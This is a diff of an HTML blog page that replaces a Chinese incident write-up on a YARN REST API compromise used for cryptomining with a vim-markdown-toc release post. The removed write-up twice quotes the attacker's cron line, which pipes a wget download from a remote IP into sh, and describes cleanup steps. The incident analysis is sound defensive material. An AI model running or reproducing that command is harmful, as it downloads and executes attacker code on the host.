@@ -4,9 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="hadoop mapreduce 任务 莫名其妙的变多了 yarn被黑问题。">
-    <meta name="keywords" content="hadoop">
-    <title>yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application</title>
+    <meta name="description" content="我写的第一款 Vim 插件的 Release 版本。">
+    <meta name="keywords" content="Vim, Markdown, Table of Contents">
+    <title>vim-markdown-toc 发布 v1.0 版</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
     <style>
@@ -102,72 +102,45 @@
 </head>
 <body class="day-mode">
     <div class="metadata">
-        <p><strong>Title:</strong> yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application</p>
-        <p><strong>Categories:</strong> hadoop yarn hack</p>
-        <p><strong>Description:</strong> hadoop mapreduce 任务 莫名其妙的变多了 yarn被黑问题。</p>
-        <p><strong>Keywords:</strong> hadoop</p>
+        <p><strong>Title:</strong> vim-markdown-toc 发布 v1.0 版</p>
+        <p><strong>Categories:</strong> Vim</p>
+        <p><strong>Description:</strong> 我写的第一款 Vim 插件的 Release 版本。</p>
+        <p><strong>Keywords:</strong> Vim, Markdown, Table of Contents</p>
     </div>
     <div class="content">
-        <p>简单介绍一下过程，现在有些人通过 hadoop 开放的restApi进行挖矿，8088 以及 8090 端口。</p>
-<h3 id="_1">排问题</h3>
+        <p>前几天，第一款由我独立开发的 Vim 插件 vim-markdown-toc 升级了功能，发布了 v1.0 版本。</p>
+<p>它的主要功能是为 Markdown 文件生成 toc（Table of Contents）、更新已经存在的 toc 和在保存时自动更新 toc。</p>
+<p>说它是当前使用 Vim 编辑 Markdown 文件时维护 Table of Contents 的最佳解决方案应该不为过。</p>
+<h2 id="_1">下载地址</h2>
 <ul>
-<li>
-<p>1. 集群检查</p>
-<p>今天检查Hadoop 服务器发现Yarn上面的job莫名其妙的变多了，而且一直再跑。
-<img alt="" src="/static/demos/7422da30-8014-41f6-a922-55f86a3ce252.png" />
-经过排查在<code>/tmp/ /var/tmp</code> 下面发现了 Java 还有tmp.txt
-内容如下：
-<img alt="" src="/static/demos/63c45ec8-bcbd-4fbd-98bb-ee624eb4ea70.png" /></p>
-<p>服务器地址:<code>transfer.sh</code></p>
-</li>
-<li>
+<li><a href="https://github.com/mzlogin/vim-markdown-toc">vim-markdown-toc</a></li>
+</ul>
+<h2 id="_2">主要更新</h2>
 <ol>
-<li>检查 <code>crontab -l</code> 发现了一个莫名其妙的 job
-    ```bash</li>
 <li>
-<ul>
-<li>
-<ul>
-<li>
-<ul>
-<li>
-<ul>
-<li>wget -q -O - http://185.222.210.59/cr.sh | sh &gt; /dev/null 2&gt;&amp;1
-```</li>
-</ul>
+<p>支持使用 <code>:UpdateToc</code> 命令更新已经存在的 toc。</p>
 </li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
+<li>
+<p>支持保存时自动更新 toc。</p>
 </li>
 </ol>
-</li>
-</ul>
-<h3 id="_2">解决办法</h3>
-<ul>
+<h2 id="_3">功能演示</h2>
+<p><img alt="vim-markdown-toc-screenshot" src="/static/mzlogin/vim-markdown-toc/master/screenshots/english.gif" /></p>
+<h2 id="_4">一些体会</h2>
+<ol>
 <li>
-<p>1，通过查看占用cpu高得进程，kill掉此进程</p>
-</li>
-<li>
-<p>2，检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件</p>
+<p>相比于 <a href="https://github.com/mzlogin/awesome-adb">awesome-adb</a> 的一千多个 Star，<a href="https://github.com/mzlogin/vim-markdown-toc">vim-markdown-toc</a> 的三十多个 Star 在我心目中含金量更高。</p>
 </li>
 <li>
-<p>3 ，通过crontab -l 查看有一个* * * * * wget -q -O - http://185.222.210.59/cr.sh | sh &gt; /dev/null 2&gt;&amp;1任务，删除此任务</p>
+<p>做能挣钱的东西，或者对自己有用的东西。</p>
 </li>
-<li>
-<p>4，排查YARN日志，确认异常的application，删除处理</p>
-</li>
-<li>
-<p>5 再通过top验证看是否还有高cpu进程，如果有，kill掉，没有的话应该正常了。</p>
-</li>
-<li>
-<p>6 注意：YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的，因此注意并启用Kerberos认证功能，禁止匿名访问修改8088端口</p>
-</li>
-</ul>
-<h4 id="_3">感谢老铁登科</h4>
-<p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
+</ol>
+<p>有天和我们组去年来的小朋友聊天，他说了一个观点我觉得很有道理：做能给自己产生经济效益的东西，你才有动力持续下去。虽然听起来功利，但不无道理。</p>
+<p>这么一个插件显然不能挣钱，它属于第二种。本次更新的功能其实在半年前就有网友提过需求，见 <a href="https://github.com/mzlogin/vim-markdown-toc/issues/6">#6</a>，但我却迟迟没有动手。半年后的某个夜里，突然就决定要把这些做出来，并且花了几个小时就做完了。究其原因，还是因为自己现在有了需求，我现在要维护几份比较长的 Markdown 文档，如果每次手动去删除已有 toc 然后再次生成，虽然比纯手工写 toc 要不知道方便和准确到哪里去了，但归根结底还是不够完美。果然最后用着自己做的功能替自己省下不少重复劳动时，那种感觉也是很爽的。</p>
+<ol>
+<li>酒香也怕巷子深。</li>
+</ol>
+<p>发布了个人的项目后，适当地在相关的社区进行推广，让更多的人享受到你的劳动成果，帮助验证和反馈，也能给自己带来更多的成就感和关注度。</p>
     </div>
     <footer>
         Power By Python Markdown Generate 2024-11-11 11:39:19
